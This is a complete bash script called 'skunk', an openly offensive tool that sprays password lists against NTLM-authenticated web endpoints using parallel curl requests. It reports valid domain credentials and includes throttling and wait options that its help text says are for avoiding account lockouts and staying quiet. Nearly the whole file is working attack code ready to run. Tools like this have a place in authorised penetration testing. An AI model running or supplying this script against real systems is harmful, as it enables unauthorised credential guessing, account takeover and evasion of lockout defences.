#!/bin/bash

## Set Default Settings
EXITSUCCESS="FALSE"
RATE=1
WAITTIME=0
VERBOSE="FALSE"
THREADS="1"
TEMPDIR=$(mktemp -d)
FIN=".success"
#DOMAIN="FALSE"
#PASSFILE="FALSE"
#USERFILE="FALSE"
#URL="FALSE"

## Define Color Escape Codes
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

## Define Functions
function log_info {
    echo -e $BLUE "[*]" $NOCOLOR $1
}

function log_warning {
    echo -e $YELLOW "[!]" $NOCOLOR $1
}

function log_error {
    echo -e $RED "[-]" $NOCOLOR $1
}

function log_success {
    echo -e $GREEN "[+]" $NOCOLOR $1
}

function print_usage {
    echo -e "skunk usage:"
    echo -e "\t skunk <arguments> [options]"
    echo -e "Arguments:"
    echo -e "\t-d,--domain <domain> - Auth Domain Name"
    echo -e "\t-u,--users  <path>   - path to file of usernames"
    echo -e "\t-p,--pass   <path>   - path to file of passwords"
    echo -e "\t-l,--url    <url>    - URL to NTLM authenticated page"
    echo -e "Options:"
    echo -e "\t-t,--threads <num>    - Number of threads to use"
    echo -e "\t-r,--rate    <time>   - Rate of each attempt in seconds"
    echo -e "\t-w,--wait    <time>   - Seconds between sprays"
    echo -e "\t-s,--stop-on-success  - Stops when valid creds are found"
    echo -e "\t-h,--help             - Print full help"
    echo -e "\t-v,--verbose          - Print verbose information"
    exit 1
}

function print_help {
    echo -e "If you have found NTLM authentication over HTTP,"
    echo -e "you can use skunk to password spray against it!"
    echo -e ""
    echo -e "Skunk attempts each user for a given password, waits for a"
    echo -e "defined time (0 seconds by default) and then moves to the next"
    echo -e "password. This wait time can be used to avoid account lockouts."
    echo -e "You can also rate limit the attemps to be more quiet."
    echo -e ""
    print_usage
}

function check_args {
    argError=FALSE 
    if [ -z ${DOMAIN+x} ] ; then
        argError=TRUE
        log_error "Missing domain name!"
    fi
    if [ -z ${USERFILE+x} ] ; then
        argError=TRUE
        log_error "Missing user file!"
    fi
    if [ -z ${PASSFILE+x} ] ; then
        argError=TRUE
        log_error "Missing pass file!"
    fi
    if [ -z ${URL+x} ] ; then
        argError=TRUE
        log_error "Missing url!"
    fi
    if [ $argError == "TRUE" ] ; then
        print_usage 
    fi
    if [ $VERBOSE == "TRUE" ] ; then
        log_warning "Verbose Mode Enabled"
    fi
    if [ $EXITSUCCESS == "TRUE" ] ; then
        log_warning "Exiting when valid creds are found"
    fi
}

function check_endpoint {
# Check the URL so that it's not returning false positives
tmp=$(curl -s -k -I $URL -o /dev/null -w '%{http_code},%{size_download},%{time_total}') 1>/dev/null
statuscode=$(echo $tmp | cut -d ',' -f 1)

if [ $statuscode == "200" ] || [ $statuscode == "302" ] || [ $statuscode == "404" ] ; then
    log_error "Server returned $statuscode. Please check your endpoint"
    exit 1
fi
}

# Splits an input file ($1) into N ($2) chunks and output to directory ($3)
function split_input_file {
    # Quick sanity check
    if [ $# -lt 3 ] ; then
        log_error "Incorrect parameters to split files."
        exit 1
    fi
    split $1 -n l/$2 $3/u
}

function print_settings {
    echo "TODO print current config..."
}

function skunk_spray {
        if [ -a $TEMPDIR/$FIN ] ; then
            log_info "Already got a hit! Thread Exiting..."
            exit 0
        fi
        for user in $(cat $1) ; do
            tmp=$(curl -s -k -I --ntlm -u "$DOMAIN\\"$user":$password" $URL -o /dev/null -w '%{http_code},%{size_download},%{time_total}') 1>/dev/null
            statuscode=$(echo $tmp | cut -d ',' -f 1)
            downsize=$(echo $tmp | cut -d ',' -f 2)
            totaltime=$(echo $tmp | cut -d ',' -f 3)
            if [ $statuscode -ne "401" ]; then 
                log_success "$DOMAIN\\\\$user:$password - SUCCESS $statuscode"
                if [ $EXITSUCCESS == "TRUE" ] ; then
                    if [ $VERBOSE == "TRUE" ] ; then
                        log_info "Response Size: $downsize"
                        log_info "Response Time: $totaltime"
                    fi
                    log_success "$DOMAIN\\\\$user:$password - SUCCESS $statuscode" >> $TEMPDIR/$FIN
                    exit 0
                fi
            else 
                log_error "$DOMAIN\\\\$user:$password - failed $statuscode"
            fi
            if [ $VERBOSE == "TRUE" ] ; then
                log_info "Response Size: $downsize"
                log_info "Response Time: $totaltime"
            fi
            sleep $RATE
    done
}

## Set traps
trap "{ echo -e '\n' ; log_error 'Terminated with Ctrl+C'; exit; }" SIGINT
trap "{ echo -e '\n' ; log_error 'An error occured!'; exit; }" ERR 

ARGS=()

while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -d|--domain)
    DOMAIN="$2"
    shift # past argument
    shift # past value
    ;;
    -u|--users)
    USERFILE="$2"
    shift # past argument
    shift # past value
    ;;
    -p|--passwords)
    PASSFILE="$2"
    shift # past argument
    shift # past value
    ;;
    -l|--url)
    URL="$2"
    shift # past argument
    shift # past value
    ;;
    -t|--threads)
    THREADS="$2"
    shift # past argument
    shift # past value
    ;;
    -r|--rate)
    RATE="$2"
    shift # past argument
    shift # past value
    ;;
    -w|--wait)
    WAITTIME="$2"
    shift # past argument
    shift # past value
    ;;
    -v|--verbose)
    VERBOSE=TRUE
    shift # past argument
    ;;
    -h|--help)
    print_help
    shift # past argument
    ;;
    -s|--stop-on-success)
    EXITSUCCESS=TRUE
    shift # past argument
    ;;
    *)    # unknown option
    ARGS+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${ARGS[@]}" # restore positional parameters

check_args
check_endpoint


if [ $VERBOSE == "TRUE" ] ; then
    print_settings
fi

if [ $THREADS -gt 20 ] ; then
    log_warning "Warning: 20+ threads could be risky!"
fi

if [ $THREADS -gt 100 ] ; then
    log_error "Too many threads!"
    exit 1
fi

proceed=y
if [ $proceed == 'y' ] ; then 
    log_info "Starting attack!"
    if [ $THREADS -eq 0 ]; then
        log_error "Cannot have 0 threads!"
        exit 1
    fi
    if [ $VERBOSE == "TRUE" ] ; then
        log_info "Running with $THREADS threads..."
    fi
    split_input_file $USERFILE $THREADS $TEMPDIR
    for password in $(cat $PASSFILE) ; do
        log_info "Spraying password: \"$password\""
        for file in $(ls $TEMPDIR) ; do
            if [ $VERBOSE == "TRUE" ] ; then
                log_info "Spawning child: $file"
            fi
            skunk_spray $TEMPDIR/$file &
        done
        if [ $VERBOSE == "TRUE" ] ; then
            log_info "Waiting for threads to exit..."
        fi
        wait
        if [ -a $TEMPDIR/$FIN ] ; then
            cat $TEMPDIR/$FIN
            log_success "Happy hunting."
            rm $TEMPDIR/$FIN
            exit 0
        fi
        log_info "Attempt of \"$password\" completed."
        log_info "Sleeping for $WAITTIME seconds..."
        sleep $WAITTIME
    done
fi
log_info "Attack Complete."
rm $TEMPDIR/$FIN

